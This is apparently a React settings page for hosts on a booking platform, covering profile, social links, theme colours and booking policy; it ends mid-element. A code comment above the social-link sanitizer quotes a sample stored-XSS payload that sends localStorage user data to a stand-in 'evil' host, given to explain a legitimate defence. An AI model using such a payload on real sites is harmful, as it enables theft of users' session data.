import { useState, useEffect } from "react";
import { useNavigate, Link } from "react-router-dom";
import { Pencil, MapPin, Camera, Check, Lock } from "lucide-react";
import { useAuth } from "../context/AuthContext";
import { updateProfile } from "../services/api";
import ImageCropper from "../components/common/ImageCropper";
import FeatureGate from "../components/common/FeatureGate";
import UsernameField from "../components/dashboard/UsernameField";
import CategoriesSection from "../components/dashboard/CategoriesSection";
import toast from "react-hot-toast";
import { fieldError } from "../utils/apiError";
import {
  getColorsForPlan,
  canUseCustomHex,
  getContrastColor,
  getPlanBorderColor,
  DEFAULT_THEME_COLOR,
  isValidHex,
  FREE_COLORS,
  CREATOR_COLORS,
  planLabel,
  isFreePlan,
  DEFAULT_COVER_IMAGE,
} from "../utils/themeUtils";
import {
  PageHeader, Card, Button, FormField, Input, Select, StickyActionBar, Tabs, cn,
} from "../components/dashboard/ui";


// Canonical cover-photo aspect ratio. Cropped to this on upload and rendered at
// this ratio in every place the cover shows (here, HostProfile, ServiceBooking)
// so one upload looks identical everywhere. Change here = change the box classes too.
const COVER_ASPECT = 3; // 3:1 banner

// Keep only the digits of a phone number (e.g. "+91 98765 43210" → "919876543210").
const digitsOf = (s) => String(s || '').replace(/[^\d]/g, '');

// ─── Section title — the one hierarchy primitive for this page ────────────────
// Brand headings are Bricolage-800 maroon (BRAND_RULES §Type). Every settings
// group leads with one of these + an optional one-line neutral subtitle, so a
// host can scan the page by its headings instead of a wall of same-size labels.
const SectionTitle = ({ children, hint }) => (
  <div className="mb-3">
    <h2 className="font-display text-lg font-extrabold tracking-tight text-maroon">{children}</h2>
    {hint && <p className="mt-0.5 text-sm text-neutral-500">{hint}</p>}
  </div>
);

// ─── Status chip — brand "live/connected" signal (maroon + pink dot) ──────────
// Replaces the off-palette green chips. The pink dot is the brand's data-signal
// for live/booked (BRAND_RULES §Signature elements).
const LiveChip = ({ children }) => (
  <span className="inline-flex items-center gap-1.5 rounded-full bg-blush px-2.5 py-0.5 text-[11px] font-semibold text-maroon">
    <span aria-hidden="true" className="inline-block h-1.5 w-1.5 rounded-full bg-pink" />
    {children}
  </span>
);

// ─── Social platform config ──────────────────────────────────────────────────
// Each platform takes just the handle; we prefill the rest. `prefix` is the grey
// label shown before the input, `base` is the full URL we store (public pages
// render the stored value as an href). `plain` platforms take a full value
// (website URL / email). `pro` platforms are gated to paid plans.
const SOCIAL_PLATFORMS = [
  { key: 'instagram', label: 'Instagram',    prefix: 'instagram.com/',    base: 'https://instagram.com/',    ph: 'yourhandle' },
  { key: 'facebook',  label: 'Facebook',     prefix: 'facebook.com/',     base: 'https://facebook.com/',     ph: 'yourpage' },
  { key: 'linkedin',  label: 'LinkedIn',     prefix: 'linkedin.com/in/',  base: 'https://linkedin.com/in/',  ph: 'you' },
  { key: 'email',     label: 'Public Email', type: 'email', plain: true,  ph: 'hello@you.com' },
  // Pro-only platforms
  { key: 'youtube',   label: 'YouTube',      prefix: 'youtube.com/@',     base: 'https://youtube.com/@',     ph: 'yourchannel', pro: true },
  { key: 'twitter',   label: 'X (Twitter)',  prefix: 'x.com/',            base: 'https://x.com/',            ph: 'yourhandle', pro: true },
  { key: 'whatsapp',  label: 'WhatsApp',     prefix: 'wa.me/',            base: 'https://wa.me/',            ph: '919876543210', pro: true },
  { key: 'github',    label: 'GitHub',       prefix: 'github.com/',       base: 'https://github.com/',       ph: 'you', pro: true },
  { key: 'website',   label: 'Website',      type: 'url',   plain: true,  ph: 'https://yourwebsite.com', pro: true },
  { key: 'tiktok',    label: 'TikTok',       prefix: 'tiktok.com/@',      base: 'https://tiktok.com/@',      ph: 'yourhandle', pro: true },
  { key: 'threads',   label: 'Threads',      prefix: 'threads.net/@',     base: 'https://threads.net/@',     ph: 'yourhandle', pro: true },
  { key: 'pinterest', label: 'Pinterest',    prefix: 'pinterest.com/',    base: 'https://pinterest.com/',    ph: 'yourhandle', pro: true },
  { key: 'telegram',  label: 'Telegram',     prefix: 't.me/',             base: 'https://t.me/',             ph: 'yourhandle', pro: true },
  { key: 'snapchat',  label: 'Snapchat',     prefix: 'snapchat.com/add/', base: 'https://snapchat.com/add/', ph: 'yourhandle', pro: true },
  { key: 'dribbble',  label: 'Dribbble',     prefix: 'dribbble.com/',     base: 'https://dribbble.com/',     ph: 'yourhandle', pro: true },
];

// Stored value (full URL) → the handle shown in the input.
const handleFromUrl = (p, url = '') => {
  if (p.plain || !p.base || !url) return url || '';
  const noScheme = url.replace(/^https?:\/\/(www\.)?/i, '');
  const baseNoScheme = p.base.replace(/^https?:\/\/(www\.)?/i, '');
  return noScheme.toLowerCase().startsWith(baseNoScheme.toLowerCase())
    ? noScheme.slice(baseNoScheme.length)
    : url; // legacy value that doesn't match the base — show it raw
};
// Typed handle → the full URL we store (empty stays empty).
const urlFromHandle = (p, handle = '') => {
  const h = handle.trim().replace(/^@+/, '').replace(/^\/+/, '');
  if (!h) return '';
  return (p.plain || !p.base) ? h : p.base + h;
};

// ─── Integrations catalog ─────────────────────────────────────────────────────
// Google Calendar is wired (its own card above). These are the rest of the
// catalog, shown as branded favicon cards (real brand marks via Google's
// favicon service, no emoji). Marked "Coming soon" until each is wired up.
const MORE_INTEGRATIONS = [
  { name: 'Zoom',                 domain: 'zoom.us',              desc: 'Auto-create Zoom meeting links' },
  { name: 'Razorpay',             domain: 'razorpay.com',         desc: 'Payments & instant payouts' },
  { name: 'PayPal',               domain: 'paypal.com',           desc: 'Accept PayPal payments' },
  { name: 'Zapier',               domain: 'zapier.com',           desc: 'Connect 6,000+ apps' },
  { name: 'Meta Pixel',           domain: 'facebook.com',         desc: 'Track ad conversions' },
  { name: 'Zoho CRM',             domain: 'zoho.com',             desc: 'Sync contacts to Zoho CRM' },
];

// Brand favicon with a graceful initial-letter fallback (no emoji).
const Favicon = ({ domain, name }) => {
  const [err, setErr] = useState(false);
  if (err || !domain) {
    return (
      <div className="grid h-9 w-9 shrink-0 place-items-center rounded-lg border border-neutral-200 bg-neutral-50 text-xs font-bold text-neutral-400">
        {name.charAt(0).toUpperCase()}
      </div>
    );
  }
  return (
    <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border border-neutral-200 bg-white">
      <img
        src={`https://www.google.com/s2/favicons?domain=${domain}&sz=64`}
        alt=""
        width="20"
        height="20"
        loading="lazy"
        className="h-5 w-5 object-contain"
        onError={() => setErr(true)}
      />
    </div>
  );
};

// ─── Social link sanitizer ───────────────────────────────────────────────────
// social_links are rendered as href on the public profile/service pages, so an
// unvalidated value like `javascript:fetch('//evil/?c='+localStorage.user)` is
// stored XSS. Never persist a non-http(s) scheme. Keep only: empty (cleared),
// a valid email (email field), or an http(s) URL. Bare domains are normalised
// to https:// to match the "full URL" UX the placeholders imply.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const sanitizeSocialLinks = (links = {}) => {
  const out = {};
  for (const { key, type } of SOCIAL_PLATFORMS) {
    const raw = String(links[key] ?? '').trim();
    if (!raw) { out[key] = ''; continue; }
    if (type === 'email') {
      out[key] = EMAIL_RE.test(raw) ? raw : '';
      continue;
    }
    if (/^https?:\/\//i.test(raw)) {
      out[key] = raw;
    } else if (/^[a-z][a-z0-9+.-]*:/i.test(raw)) {
      // Some other scheme (javascript:, data:, mailto:, …) — reject outright.
      out[key] = '';
    } else {
      // Bare domain / path → assume https.
      out[key] = `https://${raw}`;
    }
  }
  return out;
};

// ─── Color Swatch ────────────────────────────────────────────────────────────
const Swatch = ({ color, selected, onClick }) => (
  <button
    type="button"
    onClick={() => onClick(color.hex)}
    title={color.name}
    className="relative h-8 w-8 rounded-full border-2 transition-transform hover:scale-110 focus:outline-none focus-visible:ring-[3px] focus-visible:ring-rose/40 focus-visible:ring-offset-1"
    style={{
      backgroundColor: color.hex,
      borderColor: selected ? '#2B0A14' : 'transparent',
      boxShadow: selected ? '0 0 0 2px #2B0A14' : 'inset 0 0 0 1px rgba(0,0,0,0.1)',
    }}
  >
    {selected && (
      <span className="absolute inset-0 flex items-center justify-center">
        <svg style={{ color: getContrastColor(color.hex) }} className="h-3.5 w-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
        </svg>
      </span>
    )}
  </button>
);

// ─── Mini Profile Preview ────────────────────────────────────────────────────
// Mirrors the host's PUBLIC page, so it legitimately uses the host's own
// theme_color (that colour is data the host picked, not dashboard chrome).
const ProfilePreview = ({ form, themeColor }) => {
  const tc = isValidHex(themeColor) ? themeColor : DEFAULT_THEME_COLOR;
  const textOnTheme = getContrastColor(tc);
  const borderColor = getPlanBorderColor('explorer'); // preview always uses explorer

  return (
    <div className="mx-auto w-full max-w-[240px] select-none overflow-hidden rounded-3xl border-2 border-neutral-200 bg-white text-xs">
      {/* Cover — 3:1, matches every render site. Flat theme tint (no gradient). */}
      <div className="relative aspect-[3/1]">
        <img src={form.cover_image || DEFAULT_COVER_IMAGE} alt="" className="h-full w-full object-cover object-center" />
      </div>
      {/* Avatar — relative+z-10 so it paints above the positioned cover (else cover overlaps photo) */}
      <div className="relative z-10 -mt-7 flex justify-center">
        <div className="h-14 w-14 flex-shrink-0 overflow-hidden rounded-2xl border-2 bg-neutral-100" style={{ borderColor }}>
          {form.profile_image
            ? <img src={form.profile_image} alt="" className="h-full w-full object-cover" />
            : <div className="flex h-full w-full items-center justify-center text-lg font-bold text-neutral-400">{form.name?.charAt(0)?.toUpperCase() || '?'}</div>}
        </div>
      </div>
      {/* Info */}
      <div className="px-3 pb-3 pt-1.5 text-center">
        <p className="truncate font-bold text-ink">{form.name || 'Your Name'}</p>
        {(form.profession || form.tagline) && (
          <p className="mt-0.5 truncate text-[10px] font-medium" style={{ color: tc }}>{form.profession || form.tagline}</p>
        )}
        {form.bio && <p className="mt-1 line-clamp-2 text-[10px] leading-relaxed text-neutral-400">{form.bio}</p>}
        {/* CTA Preview */}
        <div className="mt-3 rounded-full px-3 py-1.5 text-[10px] font-bold" style={{ background: tc, color: textOnTheme }}>Book</div>
      </div>
    </div>
  );
};

// ─── Inline (click-to-edit) field ────────────────────────────────────────────
// Facebook/Twitter-style: shows the value; click (or the hover pencil) swaps to an
// input/textarea that commits on Enter/blur and cancels on Esc. Edits write to the
// page form state — the sticky Save bar persists everything, so there is no
// per-field API call. ponytail: reuses the page's existing save instead of adding one.
const InlineField = ({ value, onCommit, placeholder, multiline = false, inline = false, textClass = '', inputClass = '', maxLength, label }) => {
  const [editing, setEditing] = useState(false);
  const [draft, setDraft] = useState(value || '');
  useEffect(() => { setDraft(value || ''); }, [value]);

  const commit = () => { setEditing(false); if (draft !== (value || '')) onCommit(draft); };
  const cancel = () => { setDraft(value || ''); setEditing(false); };

  if (!editing) {
    return (
      <button type="button" onClick={() => setEditing(true)}
        className={cn('group gap-1 text-left', inline ? 'inline-flex max-w-full items-center' : 'flex w-full items-start gap-1.5', textClass)}>
        <span className={cn('truncate', !value && 'font-normal text-neutral-400')}>{value || placeholder}</span>
        <Pencil className={cn('h-3.5 w-3.5 shrink-0 text-neutral-300 opacity-0 transition group-hover:opacity-100', !inline && 'mt-0.5')} strokeWidth={2.25} />
      </button>
    );
  }
  const common = {
    autoFocus: true, value: draft, maxLength, 'aria-label': label,
    onChange: (e) => setDraft(e.target.value),
    onBlur: commit,
    onKeyDown: (e) => {
      if (e.key === 'Escape') cancel();
      if (e.key === 'Enter' && !multiline) { e.preventDefault(); commit(); }
    },
    className: cn('rounded-md border-2 border-maroon/40 bg-white px-2 py-1 text-ink focus:outline-none focus-visible:ring-[3px] focus-visible:ring-rose/40', inline ? 'w-auto min-w-[9rem] max-w-full' : 'w-full', inputClass),
  };
  if (multiline) {
    return (
      <div>
        <textarea rows={3} {...common} />
        {maxLength ? <p className="mt-1 text-right text-[11px] text-neutral-400">{draft.length}/{maxLength}</p> : null}
      </div>
    );
  }
  return <input type="text" {...common} />;
};

// ─── Main Component ───────────────────────────────────────────────────────────

const ProfileSetup = () => {
  const { user, updateUser } = useAuth();
  const navigate = useNavigate();
  const [cropper, setCropper] = useState(null);
  const [dirty, setDirty] = useState(false);
  // Sections grouped by the host's mental model (see docs/host-dashboard-makeover.md):
  // profile · categories · social · appearance · booking (policy + privacy) · integrations.
  const [activeSection, setActiveSection] = useState('info');

  const plan = user?.plan || 'explorer';
  const availableColors = getColorsForPlan(plan);
  const customHexAllowed = canUseCustomHex(plan);
  const isPro = !isFreePlan(plan); // Pro-gated social platforms
  // Extra colours a free host can't pick yet — shown locked under an Upgrade overlay.
  const lockedColors = CREATOR_COLORS.filter(c => !availableColors.some(a => a.hex === c.hex));

  const [form, setForm] = useState({
    name: "",
    username: "",
    bio: "",
    tagline: "",
    profession: "",
    profile_image: "",
    cover_image: "",
    location: "",
    map_link: "",
    theme_color: DEFAULT_THEME_COLOR,
    reschedule_fee: 0,
    date_of_birth: "",
    is_indexable: true, // listed in Explore + search by default
    social_links: {
      instagram: "", youtube: "", linkedin: "", facebook: "",
      twitter: "", whatsapp: "", website: "", github: "", email: "",
    },
  });
  const [customHex, setCustomHex] = useState('');
  const [loading, setLoading] = useState(false);
  const [backgroundKey, setBackgroundKey] = useState(null);

  useEffect(() => {
    if (user) {
      const sl = user.social_links || {};
      setForm({
        name:           user.name || "",
        username:       user.username || "",
        bio:            user.bio || "",
        tagline:        user.tagline || "",
        profession:     user.profession || "",
        profile_image:  user.profile_image || "",
        cover_image:    user.cover_image || "",
        location:       user.location || "",
        map_link:       user.map_link || "",
        theme_color:    user.theme_color || DEFAULT_THEME_COLOR,
        reschedule_fee: Number(user.reschedule_fee ?? 0),
        date_of_birth:  user.date_of_birth || "",
        is_indexable:   user.is_indexable !== false, // default listed unless explicitly hidden
        social_links: {
          instagram: sl.instagram || "",
          youtube:   sl.youtube   || "",
          linkedin:  sl.linkedin  || "",
          facebook:  sl.facebook  || "",
          twitter:   sl.twitter   || "",
          whatsapp:  sl.whatsapp  || "",
          website:   sl.website   || "",
          github:    sl.github    || "",
          email:     sl.email     || "",
        },
      });
      if (user.theme_color) setCustomHex(user.theme_color);
      setBackgroundKey(user.background_key || null);
    }
  }, [user]);

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
    setDirty(true);
  };
  // Social: user types a handle, we store the full prefilled URL.
  const setSocialHandle = (p, raw) => {
    setForm((f) => ({ ...f, social_links: { ...f.social_links, [p.key]: urlFromHandle(p, raw) } }));
    setDirty(true);
  };
  const handleColorSelect = (hex) => {
    setForm(f => ({ ...f, theme_color: hex }));
    setDirty(true);
  };
  const handleCustomHex = (e) => {
    const v = e.target.value;
    setCustomHex(v);
    if (isValidHex(v)) {
      setForm(f => ({ ...f, theme_color: v }));
      setDirty(true);
    }
  };

  // Commit one inline-edited field into form state (the Save bar persists it).
  const commitField = (key, v) => { setForm((f) => ({ ...f, [key]: v })); setDirty(true); };

  const handleSubmit = async (e) => {
    e.preventDefault();
    // Name is required — inline edit has no HTML `required`, so guard here.
    if (!form.name.trim()) { toast.error('Please add your name.'); return; }
    setLoading(true);
    try {
      // Strip any non-http(s) scheme (javascript:, data:, …) before persisting —
      // these values render as href on public pages and would be stored XSS.
      const payload = { ...form, background_key: backgroundKey, social_links: sanitizeSocialLinks(form.social_links) };
      const { data } = await updateProfile(payload);
      updateUser({ ...data, token: user.token, refresh_token: user.refresh_token });
      toast.success("Profile saved!");
      setDirty(false);
      navigate("/dashboard");
    } catch (err) {
      toast.error(fieldError(err, "Failed to save profile"));
    } finally {
      setLoading(false);
    }
  };

  const tc = isValidHex(form.theme_color) ? form.theme_color : DEFAULT_THEME_COLOR;

  // Back-button removed; keep the unsaved-changes guard it used to carry so a
  // refresh/tab-close with pending edits still warns.
  useEffect(() => {
    if (!dirty) return;
    const warn = (e) => { e.preventDefault(); e.returnValue = ''; };
    window.addEventListener('beforeunload', warn);
    return () => window.removeEventListener('beforeunload', warn);
  }, [dirty]);

  return (
    <div className="mx-auto max-w-5xl">
      <PageHeader
        title="Settings"
        subtitle={<>How guests discover and book you. Plan: <span className="font-semibold text-ink">{planLabel(plan, 'Starter')}</span></>}
      />

      {/* Section rail. Booking policy + privacy now live in their own "Booking &
          privacy" section instead of being buried under Integrations. Plan lives
          in the sidebar's Settings group, so it is not a tab here. */}
      <Tabs
        className="mb-6"
        value={activeSection}
        onChange={setActiveSection}
        tabs={[
          { value: 'info', label: 'Profile' },
          { value: 'social', label: 'Social' },
          { value: 'appearance', label: 'Appearance' },
          { value: 'booking', label: 'Booking & privacy' },
          { value: 'integrations', label: 'Integrations' },
        ]}
      />

      <form onSubmit={handleSubmit}>
        {/* ── SECTION: Profile Info ── */}
        {activeSection === 'info' && (
          <div className="space-y-5">
            {/* Images */}
            {cropper === "profile" && (
              <ImageCropper aspect={1} folder="profiles" currentUrl={form.profile_image}
                name={form.name} themeColor={tc}
                onUploaded={(url) => { setForm(f => ({ ...f, profile_image: url })); setDirty(true); setCropper(null); }}
                onClose={() => setCropper(null)} label="Profile Photo" />
            )}
            {/* Cover photo — cropped to 3:1 so it renders identically everywhere it's shown */}
            {cropper === "cover" && (
              <ImageCropper aspect={COVER_ASPECT} folder="covers" currentUrl={form.cover_image}
                name={form.name} themeColor={tc} avatarUrl={form.profile_image}
                onUploaded={(url) => { setForm(f => ({ ...f, cover_image: url })); setDirty(true); setCropper(null); }}
                onClose={() => setCropper(null)} label="Cover Photo" />
            )}

            <SectionTitle hint="This is how guests see you on your booking page. Click any part to edit.">
              Your public profile
            </SectionTitle>

            {/* ── WYSIWYG profile card — click any piece to edit in place ── */}
            <Card padded={false} className="overflow-hidden">
              {/* Cover (click to crop). Gated plans fall back to a flat blush banner. */}
              <FeatureGate flag="cover_photo" fallback={<div className="aspect-[3/1] bg-blush" />}>
                <button
                  type="button"
                  onClick={() => setCropper("cover")}
                  className="group relative block aspect-[3/1] w-full overflow-hidden rounded-t-2xl rounded-b-none bg-blush"
                  title="JPG/PNG/WebP up to 2MB — cropped to a 3:1 banner"
                >
                  <img
                    src={form.cover_image || DEFAULT_COVER_IMAGE}
                    alt=""
                    className="h-full w-full object-cover object-center"
                  />
                  <span className="absolute right-3 top-3 inline-flex items-center gap-1 rounded-full bg-ink/60 px-2.5 py-1 text-[11px] font-medium text-white opacity-0 transition group-hover:opacity-100">
                    <Camera className="h-3.5 w-3.5" strokeWidth={2.25} /> {form.cover_image ? "Change" : "Add cover"}
                  </span>
                </button>
              </FeatureGate>

              <div className="px-5 pb-5">
                {/* Avatar + name share a row, sitting under the cover. */}
                <div className="flex items-end gap-4">
                {/* Avatar (click to crop) — border colour reflects the plan tier. */}
                <button
                  type="button"
                  onClick={() => setCropper("profile")}
                  className="group relative -mt-6 block h-24 w-24 overflow-hidden rounded-2xl border-[3px] bg-neutral-50 shadow-sm"
                  style={{ borderColor: getPlanBorderColor(plan) }}
                  title="Change profile photo — border reflects your plan tier"
                >
                  {form.profile_image
                    ? <img src={form.profile_image} alt="" className="h-full w-full object-cover" />
                    : <span className="flex h-full w-full items-center justify-center text-2xl font-bold text-neutral-300">{form.name?.charAt(0)?.toUpperCase() || '?'}</span>}
                  <span className="absolute inset-0 flex items-center justify-center bg-ink/40 opacity-0 transition group-hover:opacity-100">
                    <Camera className="h-5 w-5 text-white" strokeWidth={2.25} />
                  </span>
                </button>

                {/* Name + KYC verified tick — sit next to the avatar, under the cover */}
                <div className="flex min-w-0 flex-1 items-center gap-2 pb-1">
                  <InlineField inline value={form.name} onCommit={(v) => commitField('name', v)}
                    placeholder="Your name" label="Host name" maxLength={80}
                    textClass="text-xl font-bold text-ink" inputClass="text-xl font-bold" />
                  {user?.kyc_status === 'approved' ? (
                    <span title="Identity verified" aria-label="Identity verified"
                      className="inline-flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-maroon text-white">
                      <Check className="h-3.5 w-3.5" strokeWidth={3} />
                    </span>
                  ) : (
                    <button type="button" onClick={() => navigate('/dashboard/kyc')}
                      title="Verify your identity (KYC)" aria-label="Verify your identity"
                      className="inline-flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-neutral-200 text-neutral-500 transition hover:bg-neutral-300">
                      <Check className="h-3.5 w-3.5" strokeWidth={3} />
                    </button>
                  )}
                </div>
              </div>

              {/* Meta — title · location · handle, all on one line */}
              <div className="mt-2 flex flex-wrap items-center gap-x-2 gap-y-1 text-sm">
                <InlineField inline value={form.profession} onCommit={(v) => commitField('profession', v)}
                  placeholder="Add a title" label="Host title" maxLength={80}
                  textClass="font-medium text-maroon" inputClass="text-sm font-medium" />
                <span aria-hidden="true" className="text-neutral-300">·</span>
                <span className="inline-flex max-w-full items-center gap-1 text-neutral-600">
                  <MapPin className="h-3.5 w-3.5 shrink-0 text-neutral-400" strokeWidth={2.25} />
                  <InlineField inline value={form.location} onCommit={(v) => commitField('location', v)}
                    placeholder="Add your city" label="Location" maxLength={80}
                    textClass="text-neutral-600" inputClass="text-sm" />
                </span>
                <span aria-hidden="true" className="text-neutral-300">·</span>
                <UsernameField user={user} variant="inline"
                  onChanged={(u) => updateUser({ ...user, username: u })} />
              </div>

              {/* Bio */}
              <div className="mt-3 border-t border-neutral-200 pt-3">
                  <InlineField value={form.bio} onCommit={(v) => commitField('bio', v)} multiline
                    placeholder="Tell people about yourself…" label="Bio" maxLength={500}
                    textClass="text-sm leading-relaxed text-neutral-600 whitespace-pre-wrap" inputClass="text-sm leading-relaxed" />
                </div>
              </div>
            </Card>

            {/* ── Details — category plus private / config fields not shown on the card ── */}
            <Card>
              <div className="space-y-4">
                <FormField label="Category" className="mb-0">
                  <CategoriesSection
                    plan={plan}
                    onSaved={(data) => updateUser({ ...user, primary_category: data.primary_category, categories: data.categories })}
                  />
                </FormField>
                <div className="grid gap-4 sm:grid-cols-2">
                  <FormField label="Search keywords" hint="Helps guests find you in search." className="mb-0">
                    <Input type="text" name="tagline" placeholder="e.g. prenatal yoga, Hindi" value={form.tagline} onChange={handleChange} maxLength={100} />
                  </FormField>
                  <FormField label="Date of birth" hint="For birthday wishes. Never public." className="mb-0">
                    <Input type="date" name="date_of_birth" value={form.date_of_birth || ''} max={new Date().toISOString().slice(0, 10)} onChange={handleChange} />
                  </FormField>
                </div>
                <FormField label="Google Maps link" hint="Shown to guests booking an in-person service." className="mb-0">
                  <Input type="url" name="map_link" placeholder="https://maps.app.goo.gl/…" value={form.map_link} onChange={handleChange} />
                </FormField>
                <p className="text-[11px] text-neutral-400">Your handle and categories save on their own; everything else saves with the bar below.</p>
              </div>
            </Card>
          </div>
        )}

        {/* ── SECTION: Social Links ── */}
        {activeSection === 'social' && (
          <div className="space-y-5">
            <SectionTitle hint="Only filled links appear on your public page.">
              Social links
            </SectionTitle>
            <FeatureGate flag="social_links" fallback={<p className="text-sm text-neutral-400">Social links are currently disabled.</p>}>
              <div className="grid grid-cols-1 gap-3 md:grid-cols-2">
                {SOCIAL_PLATFORMS.map((p) => {
                  // Pro-gated platform on a free plan — show a locked, upgrade row.
                  if (p.pro && !isPro) {
                    return (
                      <div key={p.key} className="flex items-center justify-between gap-2 rounded-md border-2 border-dashed border-neutral-200 bg-neutral-50/60 px-3 py-2.5">
                        <span className="inline-flex items-center gap-1.5 text-sm text-neutral-400">
                          <Lock className="h-3.5 w-3.5" strokeWidth={2.25} /> {p.label}
                        </span>
                        <Link to="/dashboard/upgrade?src=social" className="shrink-0 text-xs font-semibold text-maroon underline">Upgrade</Link>
                      </div>
                    );
                  }
                  // WhatsApp is a public "message me" link — a DIFFERENT thing from the
                  // number verified during onboarding for booking alerts. When that number
                  // is already verified, explain the split and offer a one-tap fill so the
                  // host isn't asked to re-type it. We never auto-publish it silently.
                  const showVerifiedWa =
                    p.key === 'whatsapp' && user?.whatsapp_verified && user?.whatsapp_number;
                  const verifiedDigits = showVerifiedWa ? digitsOf(user.whatsapp_number) : '';
                  return (
                    <FormField key={p.key} label={p.label} htmlFor={`sl-${p.key}`} className="mb-0">
                      {p.plain ? (
                        <Input id={`sl-${p.key}`} type={p.type} placeholder={p.ph}
                          value={form.social_links[p.key] || ''}
                          onChange={(e) => setSocialHandle(p, e.target.value)} />
                      ) : (
                        <div className="flex items-center overflow-hidden rounded-md border-2 border-neutral-200 bg-white focus-within:border-maroon/40">
                          <span className="shrink-0 pl-2.5 text-sm text-neutral-400">{p.prefix}</span>
                          <input id={`sl-${p.key}`} type="text" placeholder={p.ph}
                            value={handleFromUrl(p, form.social_links[p.key])}
                            onChange={(e) => setSocialHandle(p, e.target.value)}
                            className="min-w-0 flex-1 appearance-none rounded-none border-0 bg-transparent px-1 py-2 pr-2.5 text-sm text-ink shadow-none focus:border-0 focus:outline-none focus:ring-0" />
                        </div>
                      )}
                      {showVerifiedWa && (
                        <div className="mt-1.5">
                          <div className="flex flex-wrap items-center gap-x-2 gap-y-1">
                            <LiveChip>Verified for booking alerts: +{verifiedDigits}</LiveChip>
                            {!form.social_links.whatsapp?.trim() && (
                              <button
                                type="button"
                                onClick={() => {
                                  setForm(f => ({ ...f, social_links: { ...f.social_links, whatsapp: `https://wa.me/${verifiedDigits}` } }));
                                  setDirty(true);
                                }}
                                className="text-xs font-medium text-maroon hover:underline"
                              >
                                Use this number as public link
                              </button>
                            )}
                          </div>
                          <p className="mt-1 text-[11px] leading-snug text-neutral-400">
                            This is a separate <span className="font-medium">public</span> contact link shown on your page. Your booking-alert number is already saved.
                          </p>
                        </div>
                      )}
                    </FormField>
                  );
                })}
              </div>
            </FeatureGate>
          </div>
        )}

        {/* ── SECTION: Appearance & Branding ── */}
        {activeSection === 'appearance' && (
          <div className="space-y-5">
            <SectionTitle hint="Your colours on your public booking page.">
              Appearance
            </SectionTitle>
            <div className="grid gap-6 lg:grid-cols-[minmax(0,1fr)_300px] lg:items-start">
              {/* Controls — one card, so related choices share a region (proximity). */}
              <FeatureGate flag="theme_colors">
                <Card>
                  <div className="flex items-start justify-between gap-3">
                    <div>
                      <h3 className="text-sm font-semibold text-ink">Theme colour</h3>
                      <p className="mt-0.5 text-xs text-neutral-400">Used for buttons, accents and CTAs on your page.</p>
                    </div>
                    <span className="shrink-0 rounded-full bg-blush px-2.5 py-0.5 text-[10px] font-medium text-maroon">{planLabel(plan, 'Starter')}</span>
                  </div>

                  <div className="mt-4 flex flex-wrap items-center gap-2.5">
                    {availableColors.map(color => (
                      <Swatch key={color.hex} color={color} selected={form.theme_color === color.hex} onClick={handleColorSelect} />
                    ))}
                    {/* Locked Pro colours, inline to the right of the brand swatches. */}
                    {!customHexAllowed && plan !== 'creator' && lockedColors.length > 0 && (
                      <div className="relative ml-1">
                        <div className="pointer-events-none flex select-none gap-2.5 opacity-50 blur-[1.5px]" aria-hidden="true">
                          {lockedColors.slice(0, 6).map(color => (
                            <Swatch key={color.hex} color={color} selected={false} onClick={() => {}} />
                          ))}
                        </div>
                        <div className="absolute inset-0 grid place-items-center">
                          <Link
                            to="/dashboard/upgrade?src=theme"
                            className="inline-flex items-center gap-1.5 whitespace-nowrap rounded-full bg-maroon px-3.5 py-1.5 text-xs font-semibold text-white shadow-sm transition hover:bg-maroon-dark"
                          >
                            <Lock className="h-3.5 w-3.5" strokeWidth={2.25} /> Upgrade for more colours
                          </Link>
                        </div>
                      </div>
                    )}
                  </div>

                  {customHexAllowed ? (
                    <FeatureGate flag="custom_hex_color">
                      <div className="mt-4 border-t border-neutral-100 pt-4">
                        <label className="mb-2 block text-xs font-medium text-neutral-500">Custom colour</label>
                        <div className="flex items-center gap-2">
                          <label
                            className="relative h-10 w-10 shrink-0 cursor-pointer rounded-lg border-2 border-neutral-200"
                            style={{ background: isValidHex(customHex) ? customHex : '#EBDCD9' }}
                            title="Pick a colour"
                          >
                            <input
                              type="color"
                              value={isValidHex(customHex) ? customHex : '#960D32'}
                              onChange={handleCustomHex}
                              className="absolute inset-0 h-full w-full cursor-pointer opacity-0"
                              aria-label="Custom theme colour picker"
                            />
                          </label>
                          <Input type="text" placeholder="#960D32" maxLength={7} className="flex-1 font-mono" value={customHex} onChange={handleCustomHex} />
                        </div>
                      </div>
                    </FeatureGate>
                  ) : plan === 'creator' ? (
                    <p className="mt-3 text-xs text-neutral-400">16 colours available on your plan.</p>
                  ) : null}
                </Card>
              </FeatureGate>

              {/* Live preview — sticky, so it stays in view while you pick (feedback). */}
              <div className="lg:sticky lg:top-4">
                <ProfilePreview form={form} themeColor={tc} />
                <p className="mt-3 text-center text-xs text-neutral-400">Live preview · updates as you type</p>
              </div>
            </div>
          </div>
        )}

        {/* ── SECTION: Booking & privacy ── (moved out of Integrations) */}
        {activeSection === 'booking' && (
          <div className="space-y-5">
            <SectionTitle hint="Your rules for how guests book, reschedule and find you.">
              Booking & privacy
            </SectionTitle>

            {/* Reschedule fee */}
            <Card padded={false} className="p-5">
              <h3 className="mb-3 text-sm font-semibold text-ink">Booking policy</h3>
              <FormField label="Guest reschedule fee" htmlFor="reschedule_fee" hint="The platform keeps this fee. The guest's first reschedule is always free." className="mb-0">
                <Select
                  id="reschedule_fee"
                  value={form.reschedule_fee ?? 0}
                  onChange={(e) => { setForm({ ...form, reschedule_fee: Number(e.target.value) }); setDirty(true); }}
                >
                  <option value={0}>Free (₹0)</option>
                  <option value={10}>₹10 per reschedule (from the 2nd)</option>
                </Select>
              </FormField>
            </Card>

            {/* Discovery & privacy — a host can hide their own profile from Explore
                and search engines. Direct booking link still works; useful for
                professionals bound by advertising/solicitation rules (e.g. ICAI
                for Chartered Accountants). Defaults to Listed. */}
            <Card padded={false} className="p-5">
              <h3 className="mb-3 text-sm font-semibold text-ink">Discovery & privacy</h3>
              <FormField
                label="Profile visibility"
                htmlFor="is_indexable"
                hint="Hidden removes you from Explore, on-site search and search engines (noindex). Your booking link keeps working — anyone you share it with can still book you."
                className="mb-0"
